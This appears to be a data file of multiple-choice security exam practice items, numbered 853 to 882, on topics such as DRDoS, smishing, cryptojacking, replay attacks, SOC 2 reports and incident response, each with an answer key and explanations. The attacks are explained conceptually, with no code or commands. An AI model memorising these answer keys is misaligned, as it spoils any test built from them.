  {id:853,domain:T,question:"What is a Distributed Reflection Denial of Service (DRDoS) attack?",options:["A denial of service attack using only a single attacking machine","A DDoS technique where an attacker spoofs the victim's IP address when sending requests to legitimate third-party servers, causing those servers to send their responses to the victim, amplifying traffic while hiding the attacker's true source", "An attack that reflects sunlight to damage data center cooling systems","A legitimate load testing technique used by network administrators"],answer:1,explanation:"DRDoS combines reflection (using legitimate, innocent third-party servers as unwitting amplifiers) with spoofing (hiding the true attacker identity) — DNS amplification and NTP amplification attacks are specific examples of DRDoS that have been used to generate some of the largest DDoS attacks ever recorded, since the 'reflectors' are typically high-bandwidth, legitimate servers.",optionExplanations:["DRDoS is inherently distributed, leveraging many third-party reflector servers, not a single attacking source.","DRDoS's power comes from combining two techniques — using legitimate servers as unwitting traffic reflectors and IP spoofing to mask the true attacker — generating massive volumetric attacks while complicating attribution.","This is a network/protocol-based digital attack, unrelated to any physical/environmental attack vector.","DRDoS is an unauthorized, malicious attack technique, distinct from legitimate, authorized load testing performed with proper consent."]},
  {id:854,domain:A,question:"What is the purpose of implementing a bastion host (jump server)?",options:["A host that physically blocks unauthorized building entry","A hardened, tightly controlled and monitored server that serves as the single, controlled entry point for administrative access into a private/internal network segment, reducing the attack surface exposed for remote administration","A backup server used only during failover events","A host used exclusively for hosting public websites"],answer:1,explanation:"Instead of allowing direct SSH/RDP access to every internal server from the internet, administrators connect first to the bastion host (which is heavily hardened, monitored, and often requires MFA), then jump from there to internal systems — this consolidates administrative access through a single auditable, well-defended chokepoint rather than exposing many systems directly.",optionExplanations:["Bastion hosts are a network/logical security control, not a physical building security measure.","Bastion hosts centralize and harden the administrative access path, providing a single point for strong authentication, monitoring, and auditing rather than exposing numerous internal systems directly to external administrative connections.","Bastion hosts serve an ongoing operational security purpose for controlled access, distinct from disaster recovery failover systems.","Bastion hosts are specifically for controlled internal administrative access, the opposite of public-facing web hosting."]},
  {id:855,domain:O,question:"What is the purpose of automated patch management systems?",options:["Systems that automatically write new application code","Tools that automate the process of identifying, testing, deploying, and verifying security patches across an organization's systems, reducing the window of vulnerability exposure from manual, inconsistent patching processes","Systems used only for patching physical building infrastructure","A backup tool unrelated to security updates"],answer:1,explanation:"Automated patch management (WSUS, SCCM, Ivanti) can identify missing patches across thousands of endpoints, deploy them in scheduled maintenance windows, and report on patch compliance status — given that unpatched known vulnerabilities remain one of the most common breach causes, automation significantly reduces the time window during which systems remain exposed to known, exploitable flaws.",optionExplanations:["Patch management deploys vendor-released fixes, it doesn't generate new application code.","Automated patch management directly addresses one of the most persistent root causes of breaches — unpatched known vulnerabilities — by reducing the time and consistency gaps inherent in manual patching across large environments.","This is software/system patching, distinct from physical facility maintenance.","Patch management is specifically focused on deploying security and functionality updates, directly relevant to maintaining a secure posture."]},
  {id:856,domain:T,question:"What is a smishing attack?",options:["A phishing attack conducted via fax machines","Phishing conducted via SMS text messages, attempting to trick recipients into clicking malicious links or divulging sensitive information through deceptive text messages","An attack targeting smart home devices specifically","A legitimate SMS-based two-factor authentication system"],answer:1,explanation:"Smishing messages often impersonate banks, delivery services, or government agencies ('Your package couldn't be delivered, click here to reschedule') — SMS messages can be particularly effective since mobile users may have lower guard against text-based deception compared to email, and links are harder to inspect/hover-preview on mobile devices.",optionExplanations:["Smishing specifically refers to SMS (text message)-based phishing, not fax-based deception.","Smishing exploits the unique trust and lower scrutiny users often apply to SMS messages compared to email, combined with the difficulty of verifying links on mobile devices before tapping them.","While IoT/smart devices can be targeted by other attacks, 'smishing' specifically refers to SMS phishing, not a smart-device-specific attack category.","This describes a legitimate security feature (SMS-based 2FA), the opposite of the malicious smishing attack technique."]},
  {id:857,domain:P,question:"What is the purpose of a service organization control (SOC) 2 Type II report?",options:["A report verifying a company's annual revenue","An independent auditor's report verifying that an organization's controls related to security, availability, processing integrity, confidentiality, and/or privacy operated effectively over a specified period of time (not just at a single point in time)","A report verifying physical building safety code compliance","A marketing brochure describing a company's products"],answer:1,explanation:"SOC 2 Type II differs from Type I (which only verifies controls were suitably designed at a single point in time) by testing operating effectiveness over a period (typically 6-12 months) — this distinction matters because a control could be well-designed on paper but not consistently followed in practice, which Type II's extended observation period is specifically designed to catch.",optionExplanations:["SOC 2 is unrelated to financial revenue reporting; it specifically addresses security/trust service criteria.","Type II's extended testing period provides significantly stronger assurance than a point-in-time assessment, since it validates consistent, ongoing operational effectiveness rather than just design adequacy.","SOC 2 addresses information security and related trust principles, not building/fire safety code compliance.","SOC 2 reports are formal audit deliverables used for vendor due diligence and compliance, not promotional marketing materials."]},
  {id:858,domain:T,question:"What is an on-path attack (formerly known as man-in-the-middle)?",options:["An attack that requires physical presence on a delivery route", "An attack where the adversary positions themselves between two communicating parties to intercept, and potentially alter, the data being exchanged, without either party's knowledge", "A legitimate network path optimization technique","An attack targeting only postal mail systems"],answer:1,explanation:"CompTIA's updated terminology ('on-path attack') describes the same concept previously called 'man-in-the-middle' — emphasizing the attacker's network position relative to the communication path rather than gendered terminology, while the underlying threat (covert interception/manipulation of communications between trusting parties) remains the same.",optionExplanations:["This is a network/cyber attack describing logical positioning in a data path, not physical transportation routes.","On-path attacks fundamentally rely on the attacker successfully positioning themselves within the legitimate communication flow, allowing covert interception or manipulation that breaks the assumed direct trust between the two communicating endpoints.","On-path positioning describes a malicious attack vector, not a legitimate network engineering/optimization technique.","'Mail' here refers to network/data communications, not literal postal services — this is simply updated terminology for MITM attacks."]},
  {id:859,domain:A,question:"What is the purpose of network segmentation between IT and OT (Operational Technology) environments?",options:["Segmentation purely for organizational chart purposes","Isolating industrial control systems and operational technology (which often run legacy, unpatched systems controlling physical processes) from the corporate IT network, limiting the ability of an IT compromise to spread into critical infrastructure", "Segmentation that has no security benefit, only cost benefit","A practice that is illegal under most industrial regulations"],answer:1,explanation:"The 2021 Colonial Pipeline incident demonstrated the risk when IT/OT separation is insufficient — though the OT systems weren't directly compromised, the company proactively shut down pipeline operations due to IT compromise concerns, highlighting how IT/OT segmentation (using firewalls, data diodes, and the Purdue Model architecture) is critical since OT systems often can't be patched/secured the same way as IT systems due to uptime and safety requirements.",optionExplanations:["This is a critical technical security control protecting physical/industrial processes, not merely an organizational structure designation.","IT/OT segmentation is increasingly recognized as essential given that OT systems often run unpatched legacy software controlling physical, safety-critical processes — limiting blast radius from IT-side compromises is a primary defense given OT's inherent patching limitations.","IT/OT segmentation provides substantial security benefit beyond cost, directly protecting critical infrastructure and safety systems from cyber-originated disruption.","Proper segmentation is generally a recommended and often required practice (e.g., NERC CIP for power utilities), not an illegal one."]},
  {id:860,domain:O,question:"What is the purpose of a security metrics dashboard for executive reporting?",options:["A dashboard showing only individual analyst performance reviews","A visual reporting tool that translates technical security data into business-relevant metrics and trends (e.g., risk exposure, patch compliance, incident trends) to help executives understand security posture and make informed resource allocation decisions","A dashboard used only by the marketing department","A tool for tracking employee vacation schedules"],answer:1,explanation:"Effective executive dashboards avoid overwhelming leadership with raw technical detail (like CVE counts) and instead present trends and business risk context (e.g., 'critical vulnerability remediation time has decreased 40% this quarter, but third-party vendor risk remains elevated') — this enables non-technical executives to understand security posture and make informed budget/risk decisions.",optionExplanations:["Executive dashboards focus on aggregate organizational security posture and risk, not individual employee performance evaluation.","Translating technical data into business-relevant context is essential for executive engagement and informed decision-making, since most executives lack the technical background to interpret raw security metrics directly.","Security dashboards serve security/risk governance purposes for leadership, unrelated to marketing department functions.","Vacation tracking is an HR/operational function, unrelated to security posture reporting."]},
  {id:861,domain:T,question:"What is a cryptojacking attack?",options:["An attack that steals cryptocurrency wallet files directly","Unauthorized use of a victim's computing resources (CPU/GPU) to mine cryptocurrency, often delivered via malware or malicious browser scripts, without the victim's knowledge or consent","A legitimate cryptocurrency mining service offered by cloud providers","An attack that encrypts cryptocurrency exchanges for ransom"],answer:1,explanation:"Cryptojacking malware or malicious JavaScript (running in a compromised website) silently consumes victim CPU/GPU resources to mine cryptocurrency for the attacker's benefit — symptoms include unexplained high CPU usage, system slowdown, and increased electricity costs; while less immediately destructive than ransomware, it represents unauthorized resource theft and can indicate broader compromise.",optionExplanations:["Cryptojacking abuses computing resources for mining rather than directly stealing existing wallet contents (which would be a different attack like wallet credential theft).","Cryptojacking is attractive to attackers because it's relatively low-risk/low-detection compared to more disruptive attacks like ransomware, generating ongoing passive income by quietly stealing victim compute resources.","Legitimate cloud mining services involve explicit consent and payment; cryptojacking is defined by its unauthorized, covert nature.","This describes unauthorized resource theft for mining, not a ransomware-style encryption attack against exchange infrastructure."]},
  {id:862,domain:G,question:"What is the purpose of the principle of 'fail securely' (fail closed) in system design?",options:["Designing systems to never fail under any circumstances","Designing systems so that when a failure occurs (e.g., authentication service outage), the default behavior denies access rather than granting it, prioritizing security over availability in failure scenarios","Designing systems to fail as quickly and visibly as possible regardless of consequences","Allowing all access automatically whenever any system component fails"],answer:1,explanation:"A fail-secure access control system that loses connection to its authentication server should default to denying entry (even if inconvenient) rather than failing 'open' and granting unrestricted access — though this principle must be balanced against safety-critical systems (like fire door locks) where failing open may be required for life safety, illustrating the security-vs-safety tradeoff designers must navigate.",optionExplanations:["No system can guarantee zero failures; the design principle addresses how the system behaves WHEN failure occurs, not preventing all failure.","Fail-secure design accepts a potential availability tradeoff (denying access during failure) in exchange for maintaining the security posture, recognizing that most failures should default toward the safer, more restrictive state.","While failures should be detected/logged, 'fail securely' specifically concerns the access decision outcome during failure, not failure visibility/speed for its own sake.","This describes 'fail open,' essentially the opposite of fail-secure design, which would create a significant security gap during any failure event."]},
  {id:863,domain:O,question:"What is the purpose of conducting a gap analysis against a security framework (e.g., NIST CSF)?",options:["Analyzing physical gaps in server room flooring","Comparing an organization's current security practices and controls against a chosen framework's requirements to identify deficiencies, prioritize remediation efforts, and guide a roadmap toward compliance or maturity improvement","An analysis used only during initial company formation","A one-time analysis that never needs to be repeated"],answer:1,explanation:"A gap analysis against NIST CSF's five functions (Identify, Protect, Detect, Respond, Recover) might reveal that an organization has strong 'Protect' controls (firewalls, access control) but weak 'Detect' and 'Respond' capabilities (no SIEM, undefined IR plan) — this informs where to prioritize investment to achieve more balanced, comprehensive security maturity.",optionExplanations:["This is a security program maturity assessment, unrelated to physical building infrastructure.","Gap analyses provide a structured, prioritized roadmap for security improvement by clearly identifying where current practices fall short of a recognized framework's requirements, guiding resource allocation.","Gap analyses are valuable at any organizational maturity stage, not just during initial formation, particularly as frameworks and threats evolve.","Security frameworks and organizational environments evolve continuously, requiring periodic re-assessment to maintain an accurate, current view of the security gap."]},
  {id:864,domain:T,question:"What is a replay attack?",options:["An attack that physically replays recorded video surveillance footage","An attack where a valid data transmission (such as an authentication token or transaction) is fraudulently intercepted and retransmitted later to gain unauthorized access or repeat a transaction", "A method for backing up and replaying database transactions for testing","A type of legitimate session resumption mechanism"],answer:1,explanation:"If a system doesn't use proper anti-replay measures (timestamps, nonces, sequence numbers), an attacker who intercepts a legitimate authentication request or financial transaction can simply resend that exact same captured data later to be authenticated or repeat the transaction fraudulently — defenses include timestamping requests, using single-use nonces, and implementing short validity windows for tokens.",optionExplanations:["This is a network/cryptographic attack on data transmissions, unrelated to video surveillance footage.","Replay attacks specifically exploit the absence of freshness/uniqueness verification in transmitted data — proper anti-replay mechanisms (nonces, timestamps, sequence numbers) are essential defenses in authentication and transaction protocols.","This describes a legitimate testing/development practice, the opposite of the malicious unauthorized retransmission attack.","Legitimate session resumption uses proper cryptographic protocols with freshness guarantees; replay attacks specifically exploit the lack of such protections to maliciously reuse captured data."]},
  {id:865,domain:A,question:"What is the purpose of implementing application allowlisting (whitelisting)?",options:["Maintaining a list of websites employees are allowed to visit only","A security control that only permits pre-approved, explicitly authorized applications/executables to run on a system, blocking all others by default, providing strong protection against unknown malware and unauthorized software","A list of approved vendors for purchasing software","A backup list of applications to reinstall after a system wipe"],answer:1,explanation:"Unlike blocklisting (denying known-bad applications, which fails against new/unknown threats), allowlisting (using tools like AppLocker or Windows Defender Application Control) takes a default-deny stance — only explicitly approved applications can execute, providing strong protection against zero-day malware and unauthorized software installation, though it requires more administrative overhead to maintain the approved list as legitimate software needs change.",optionExplanations:["Website allowlisting (URL filtering) is a related but distinct control; application allowlisting specifically governs which executables/programs can run on the endpoint.","Application allowlisting's default-deny approach is particularly effective against zero-day and unknown malware, since unrecognized executables simply can't run, regardless of whether security tools have signatures for them yet.","Vendor approval lists are a procurement/business process, distinct from the technical endpoint control of restricting executable execution.","Allowlisting is an active, ongoing execution control, not a backup/recovery list for reinstallation purposes."]},
  {id:866,domain:O,question:"What is the purpose of conducting a tabletop exercise specifically focused on ransomware scenarios?",options:["Testing only the physical security of the data center against ransomware","Simulating a ransomware incident scenario in a discussion-based format to test the organization's decision-making, communication, and technical response procedures, including critical decisions like whether to pay a ransom","A marketing exercise to sell ransomware insurance products","A technical exercise that actually deploys ransomware on production systems"],answer:1,explanation:"Ransomware tabletop exercises walk through difficult decisions in advance — who has authority to decide on ransom payment, how to communicate with customers/regulators during an outage, whether cyber insurance covers the incident, and how to determine if backups are viable for recovery — making these decisions calmly beforehand is far more effective than improvising during an actual, high-pressure ransomware crisis.",optionExplanations:["Ransomware tabletops focus on organizational decision-making and procedural response, not physical building security testing.","Ransomware scenarios involve uniquely difficult decisions (ransom payment, regulatory notification, business continuity tradeoffs) that benefit enormously from being pre-discussed and planned for in a low-stakes tabletop setting.","Tabletop exercises are internal organizational preparedness activities, not externally-facing sales/marketing activities.","Tabletop exercises are explicitly discussion-based simulations, never involving actual deployment of malware on live systems."]},
  {id:867,domain:T,question:"What is a credential harvesting attack?",options:["A legitimate process for collecting employee feedback","An attack technique, often via phishing pages or compromised systems, specifically designed to collect usernames, passwords, or other authentication credentials from victims for later malicious use", "A method for backing up password databases securely","An attack that physically removes RFID badges"],answer:1,explanation:"Credential harvesting phishing pages mimic legitimate login portals (Office 365, banking sites) to capture entered credentials, which are then used for account takeover, sold on dark web markets, or used as a foothold for further attacks like credential stuffing against other services — harvested credentials are among the most valuable and commonly traded commodities in cybercrime.",optionExplanations:["This describes a malicious data theft technique, not a legitimate organizational feedback collection process.","Credential harvesting is often the explicit goal of phishing campaigns, since stolen credentials provide direct, persistent access value that can be monetized or leveraged for further attacks far beyond the initial compromise.","This isn't a secure backup process; it's an unauthorized theft technique targeting authentication data.","This is a digital data theft attack, not a physical badge/token theft technique."]},
  {id:868,domain:P,question:"What is the purpose of obtaining cyber liability insurance?",options:["Insurance that replaces the need for any technical security controls","A specialized insurance policy that helps organizations financially mitigate the costs associated with a cyber incident, such as breach response, legal fees, regulatory fines, and business interruption losses", "Insurance covering only physical hardware damage from fire or flood","A policy required for all employees individually to purchase"],answer:1,explanation:"Cyber insurance can cover costs like forensic investigation, customer notification, credit monitoring services, legal defense, and even ransom payments in some policies — however, insurers increasingly require evidence of baseline security controls (MFA, EDR, backups) as a condition of coverage, recognizing that insurance complements rather than replaces actual security investment.",optionExplanations:["Insurers increasingly require demonstrable security controls as a prerequisite for coverage, and insurance addresses financial impact, not the technical prevention of incidents themselves.","Cyber insurance specifically addresses the financial consequences of cyber incidents, complementing (not replacing) technical and procedural security controls that reduce the likelihood and impact of incidents in the first place.","This is a distinct risk category from traditional property insurance covering physical disasters; cyber insurance specifically addresses digital/data-related incidents.","This is an organizational-level policy covering the company's risk exposure, not an individual employee purchase requirement."]},
  {id:869,domain:A,question:"What is the purpose of implementing DNS filtering as a security control?",options:["Filtering DNS purely to improve resolution speed","Blocking access to known malicious, phishing, or otherwise inappropriate domains at the DNS resolution level, preventing devices from connecting to these destinations even before a network connection is established","A backup mechanism for DNS server failure","A method exclusively for blocking competitor websites"],answer:1,explanation:"DNS filtering services (Cisco Umbrella, Cloudflare Gateway) maintain threat intelligence feeds of known malicious domains and block resolution requests to them — this provides an early, low-overhead layer of defense since malware often needs to resolve a C2 domain to communicate, and blocking that resolution can neutralize the threat before any actual malicious traffic is established.",optionExplanations:["While performance can be a side benefit, the primary security purpose is blocking malicious destinations, not speed optimization.","DNS filtering provides defense at an efficient layer — blocking resolution prevents connection attempts to malicious infrastructure before any actual malicious payload delivery or C2 communication can occur.","DNS filtering is an active security control providing ongoing protection, not a failover/backup mechanism for DNS infrastructure outages.","Legitimate DNS filtering targets known-malicious or policy-violating categories of content, not business competitor blocking, which would raise ethical and likely legal concerns."]},
  {id:870,domain:O,question:"What is the purpose of conducting a controlled phishing simulation campaign?",options:["A campaign designed to actually steal employee credentials for management review","Sending simulated, harmless phishing emails to employees to measure susceptibility, reinforce security awareness training, and identify individuals or departments needing additional targeted education","A campaign used only to punish employees who click on links","A one-time test with no ongoing program or follow-up"],answer:1,explanation:"Effective phishing simulation programs (using platforms like KnowBe4 or Proofpoint) track click rates over time, provide immediate just-in-time training for employees who click (rather than punitive action), and use results to identify patterns (e.g., a specific department needs additional training) — the goal is behavior change and awareness improvement, not punishment or credential theft.",optionExplanations:["Simulated phishing campaigns don't actually steal/retain credentials maliciously; they're a controlled training tool, and any captured test data is used for improvement, not retention.","Phishing simulations directly measure and improve the human element of security, identifying training gaps so resources can be targeted effectively at the employees/departments most in need.","Best practice phishing simulation programs use clicking as a learning opportunity (just-in-time training) rather than punitive measures, which research shows discourages honest reporting of real phishing attempts.","Effective programs run phishing simulations regularly (not just once) to reinforce ongoing awareness and track improvement trends over time."]},
  {id:871,domain:T,question:"What is a Bluetooth bluejacking attack?",options:["A severe attack that completely takes over and disables a Bluetooth device","Sending unsolicited messages or files to Bluetooth-enabled devices within range, often as a nuisance or minor prank rather than a serious security threat, distinct from more dangerous Bluetooth attacks like bluesnarfing","A legitimate Bluetooth pairing notification system","An attack that physically disables Bluetooth hardware chips"],answer:1,explanation:"Bluejacking is relatively low-risk — typically just sending unsolicited contact cards or text messages to nearby discoverable devices — and is distinct from bluesnarfing (unauthorized data theft from a Bluetooth device) or bluebugging (gaining full unauthorized control), which are far more serious security threats.",optionExplanations:["This describes bluebugging (full device takeover), a much more serious attack than the relatively minor nuisance of bluejacking.","Bluejacking is generally categorized as a low-severity nuisance attack, important to distinguish from the more serious data theft (bluesnarfing) and device control (bluebugging) Bluetooth attack variants for exam purposes.","Bluejacking is unauthorized/unsolicited, not a legitimate notification feature, though it's relatively benign compared to other Bluetooth attacks.","Bluejacking doesn't damage hardware; it's about sending unsolicited messages, not physical/hardware-level attacks."]},
  {id:872,domain:A,question:"What is the purpose of a software-defined perimeter (SDP) architecture?",options:["A perimeter defined purely by physical building boundaries","A security framework that dynamically creates individualized, encrypted network connections between authenticated/authorized users and specific resources, making infrastructure invisible to unauthorized users ('black cloud') and aligning closely with zero trust principles","A perimeter that only protects against physical intrusion","A backup network perimeter used during primary firewall failure"],answer:1,explanation:"SDP (sometimes called a 'black cloud' approach) verifies user identity and device posture before granting access, then creates a direct, encrypted micro-tunnel to only the specific authorized resource — unlike traditional perimeter security, unauthorized users can't even see that protected resources exist on the network (no open ports visible to port scanning), significantly reducing the attack surface.",optionExplanations:["SDP is a logical/software network security architecture, not defined by physical building boundaries.","SDP fundamentally shifts away from traditional 'trusted network perimeter' models toward identity-centric, resource-specific dynamic access — directly implementing zero trust principles by making unauthorized resources invisible rather than just access-restricted.","SDP addresses network/logical access security, a different scope from physical intrusion prevention.","SDP is a primary, ongoing security architecture approach, not merely a failover/backup mechanism for traditional firewalls."]},
  {id:873,domain:O,question:"What is the purpose of implementing automated security orchestration playbooks for phishing response?",options:["Playbooks used only for musical performances in the SOC","Pre-defined, automated workflows that handle common phishing response steps (quarantining the email, checking for clicks, resetting credentials if needed, blocking the sender) without requiring manual analyst intervention for each step, improving response speed and consistency","A backup procedure used only when SOAR tools are unavailable","A playbook requiring full manual execution with no automation"],answer:1,explanation:"A SOAR phishing playbook might automatically pull the email's headers and attachments for analysis, check if any other users received the same email and auto-quarantine those copies, query EDR to see if any recipients clicked the link, and auto-create a ticket — reducing response time from potentially hours of manual work to minutes, and ensuring consistent handling regardless of which analyst (or shift) is working.",optionExplanations:["This is wordplay; security playbooks have nothing to do with music.","Automated phishing playbooks significantly reduce response time and ensure consistency for high-volume, well-understood incident types, freeing analyst time for more complex investigations.","Playbooks are the primary automated workflow itself within SOAR tools, not a fallback used only in their absence.","The defining value of these playbooks is automation of repetitive steps; fully manual execution would defeat their core purpose of speed and consistency."]},
  {id:874,domain:T,question:"What is a watering hole attack's primary advantage for attackers compared to direct phishing?",options:["It requires no technical skill whatsoever to execute","It can compromise well-defended, security-aware targets who would be unlikely to fall for direct phishing attempts, by exploiting their trust in legitimate third-party websites they routinely visit","It is always faster to execute than sending a phishing email","It guarantees compromise of every visitor to the compromised site"],answer:1,explanation:"Watering hole attacks are particularly valuable against sophisticated targets (security researchers, government employees, defense contractors) who have strong security awareness and would likely recognize/report a direct phishing attempt — by compromising a trusted third-party site instead, attackers bypass the target's heightened suspicion of direct communications.",optionExplanations:["Watering hole attacks actually require significant technical skill — compromising a legitimate third-party website and often deploying browser exploits is considerably more complex than crafting a phishing email.","This advantage is precisely why APT groups favor watering hole attacks against high-value, security-conscious targets — it circumvents their learned suspicion of direct phishing by exploiting trust in already-visited legitimate sites.","Watering hole attacks require time-intensive reconnaissance (identifying target browsing habits) and site compromise, typically making them slower to set up than a phishing campaign.","Success depends on the victim having a vulnerable, unpatched browser/plugin and visiting during the attack window — it's not guaranteed for every visitor, especially those with updated, patched systems."]},
  {id:875,domain:G,question:"What is the purpose of implementing a 'defense in depth' security strategy?",options:["Relying on a single, extremely strong security control instead of multiple layers","Implementing multiple, layered, and redundant security controls throughout a system so that if one control fails or is bypassed, additional controls still provide protection", "A strategy focused exclusively on perimeter firewall strength","A cost-cutting strategy that minimizes the total number of security controls"],answer:1,explanation:"A defense-in-depth approach for a database might include network segmentation, a firewall, an IPS, strong authentication, encryption at rest, database activity monitoring, and regular access reviews — even if an attacker bypasses the firewall, they still face multiple additional obstacles, unlike a single-point-of-failure approach where one bypassed control means complete compromise.",optionExplanations:["This describes the opposite approach; defense in depth specifically avoids single points of failure by layering multiple independent controls.","Defense in depth's core value is resilience — since no single control is perfect, layering ensures that a failure or bypass of one control doesn't result in complete compromise, requiring attackers to overcome multiple independent obstacles.","Defense in depth spans the entire environment (network, host, application, data, physical, human), not solely the network perimeter.","Defense in depth often requires more investment in multiple controls, not cost reduction — it's a security effectiveness strategy, not primarily a budget optimization one."]},
  {id:876,domain:O,question:"What is the purpose of measuring and tracking 'dwell time' as a security metric?",options:["Measuring how long employees stay at their desks","Measuring the length of time an attacker remains undetected within a network from initial compromise to detection, with shorter dwell time generally indicating more effective detection capabilities and reduced potential damage","Measuring server response time for customer-facing applications","Measuring how long security tickets sit unassigned in a queue"],answer:1,explanation:"Industry dwell time averages have decreased over recent years due to improved detection technology (EDR, better SIEM analytics) but can still range from days to many months for sophisticated attacks — every additional day of undetected dwell time generally correlates with increased opportunity for data exfiltration, lateral movement, and overall breach impact, making dwell time reduction a key security program objective.",optionExplanations:["This is an HR/workplace metric, unrelated to detecting attacker presence in systems.","Dwell time is one of the most impactful security metrics because it directly correlates with breach severity — every day an attacker operates undetected typically increases the scope of compromise, data theft, and remediation cost.","Application performance metrics are operational/IT metrics, distinct from the security-specific concept of attacker dwell time.","Ticket queue time is an operational efficiency metric, different from the security concept of measuring attacker presence duration before detection."]},
  {id:877,domain:T,question:"What is a UDP flood attack?",options:["A legitimate stress test for UDP-based applications","A denial-of-service attack that overwhelms a target with a high volume of UDP packets sent to random ports, forcing the target to repeatedly check for listening applications and respond with ICMP 'destination unreachable' packets, consuming resources","An attack that exploits a vulnerability specific to TCP connections only","A method for compressing UDP packet headers"],answer:1,explanation:"Because UDP is connectionless (no handshake required like TCP), attackers can rapidly send massive volumes of spoofed UDP packets without needing to complete any negotiation — the target system's resource consumption checking each port and generating responses, combined with the connectionless nature making source verification difficult, makes UDP floods a common and effective volumetric DoS technique.",optionExplanations:["This is an unauthorized, malicious attack technique, not an authorized stress testing methodology.","UDP floods exploit the protocol's connectionless nature — no handshake is required, allowing attackers to send overwhelming traffic volumes quickly while the target expends resources processing each packet and generating unreachable responses.","UDP floods specifically target UDP's connectionless protocol characteristics; TCP-based attacks (like SYN floods) exploit different protocol mechanics.","This is a denial-of-service attack technique, unrelated to data compression/optimization."]},
  {id:878,domain:A,question:"What is the purpose of implementing just-in-time (JIT) access provisioning?",options:["Provisioning access only during specific calendar holidays","Granting users elevated or privileged access only for the specific time window needed to complete a task, automatically revoking that access afterward, rather than maintaining standing privileged access indefinitely","A backup access method used only during system outages","A method for speeding up new employee onboarding regardless of security review"],answer:1,explanation:"JIT access (implemented via PAM solutions like CyberArk or Azure PIM) significantly reduces the standing attack surface — instead of an admin having permanent domain admin rights that could be compromised at any time, they request elevated access for a specific task, it's granted temporarily (e.g., 2 hours) with approval and logging, then automatically revoked, minimizing the window during which those credentials pose risk if compromised.",optionExplanations:["JIT access is about minimizing the duration of privilege regardless of calendar timing, not tied to specific holiday periods.","JIT access directly supports least privilege and zero standing privilege principles by minimizing the time window during which elevated credentials exist and could be compromised or misused.","JIT is a standard, ongoing privileged access management practice, not specifically an outage/emergency access mechanism.","JIT specifically refers to temporary privilege elevation with proper approval workflows, not a shortcut that bypasses security review during onboarding."]},
  {id:879,domain:O,question:"What is the purpose of an incident response communication plan?",options:["A plan that only covers internal Slack/Teams messaging etiquette","A predefined plan detailing who needs to be informed during an incident, what information to share, through which channels, and at what cadence — covering internal stakeholders, customers, regulators, and potentially media/public relations","A plan for setting up new employee email accounts","A marketing communication plan unrelated to security"],answer:1,explanation:"Communication plans prevent costly mistakes during high-pressure incidents — like a well-meaning employee posting incident details on social media before legal/PR has prepared an official statement, or missing a regulatory breach notification deadline (e.g., GDPR's 72-hour requirement) due to unclear ownership of that responsibility.",optionExplanations:["Communication plans address all critical incident stakeholders and channels, not solely internal collaboration tool conventions.","Comprehensive communication planning prevents both under-communication (missing required regulatory notifications, leaving customers uninformed) and over-communication (premature or unauthorized disclosure) during high-stress incident scenarios.","Email account provisioning is an IT operations task, unrelated to incident communication planning.","Incident communication plans are specifically security/crisis-focused, distinct from general business marketing communications."]},
  {id:880,domain:T,question:"What is a wireless jamming attack?",options:["An attack that improves wireless signal strength for legitimate users","A denial-of-service attack that transmits interfering radio frequency signals to disrupt or block legitimate wireless communications, preventing devices from establishing or maintaining a connection","A legitimate technique for testing wireless coverage","An attack requiring direct physical access to network cables"],answer:1,explanation:"Jamming attacks flood the same frequency spectrum used by WiFi (2.4GHz/5GHz) or other wireless protocols with noise/interference, denying service to legitimate users — unlike most cyberattacks, jamming requires physical proximity to the target's RF range and specialized equipment, and is illegal in most jurisdictions under telecommunications regulations regardless of intent.",optionExplanations:["Jamming degrades or completely denies legitimate wireless service through RF interference, the opposite of improving connectivity.","Jamming attacks exploit the shared, contested nature of RF spectrum — by flooding the relevant frequency with noise, legitimate devices cannot successfully transmit or receive, causing a denial of service specific to wireless communications.","Jamming is an unauthorized, illegal disruption technique, not a legitimate coverage testing methodology (which would use a spectrum analyzer instead).","Jamming requires physical proximity within RF range of the target but doesn't require accessing or touching network cables; it operates purely through radio frequency interference."]},
  {id:881,domain:G,question:"What is the purpose of a security policy exception review board or governance committee?",options:["A board that approves only employee vacation requests","A governing body of stakeholders that reviews and approves significant security policy exceptions, risk acceptances, and major security decisions, ensuring appropriate oversight and cross-functional input","A committee that only handles physical building maintenance","A board that operates independently with no accountability to executive leadership"],answer:1,explanation:"Governance committees (often including representatives from security, legal, IT, and business units) provide checks and balances for significant risk decisions — preventing any single individual from unilaterally accepting major organizational risk, and ensuring decisions consider multiple perspectives (legal liability, business impact, technical feasibility) before approval.",optionExplanations:["This is a security risk governance function, unrelated to HR vacation approval processes.","Governance committees provide essential cross-functional oversight for significant security risk decisions, preventing unilateral risk acceptance and ensuring decisions are well-informed and accountable across the organization.","Security governance committees address policy and risk decisions broadly, not narrowly focused on physical facilities.","Governance committees typically report to and are accountable to executive leadership/the board, providing a structured escalation and accountability path, not operating in isolation."]},
  {id:882,domain:O,question:"What is the purpose of conducting a forensic memory (RAM) capture during incident response?",options:["Capturing memory only to free up disk space","Preserving the volatile contents of a system's RAM, which can contain critical evidence like running processes, network connections, encryption keys, and malware that exists only in memory (fileless malware) and would be lost upon system shutdown","A routine backup procedure performed on a daily schedule","A technique used only to test hardware memory for defects"],answer:1,explanation:"Memory is volatile — its contents are lost the moment a system powers off — making memory capture (using tools like FTK Imager or Volatility for analysis) critical for capturing evidence of fileless malware, active malicious processes, or decryption keys that would never be discoverable from a disk image alone, which is why proper IR procedure often calls for memory capture before any system shutdown.",optionExplanations:["Memory capture is for forensic evidence preservation, not a storage management technique.","Memory capture is uniquely time-sensitive and valuable because volatile data (running processes, network state, in-memory malware, encryption keys) is irretrievably lost once a system is powered off, unlike persistent disk-based evidence.","Memory capture during IR is an as-needed forensic procedure tied to active investigations, not a routine scheduled backup process.","This is a security forensic technique for evidence preservation, not hardware diagnostic testing."]},
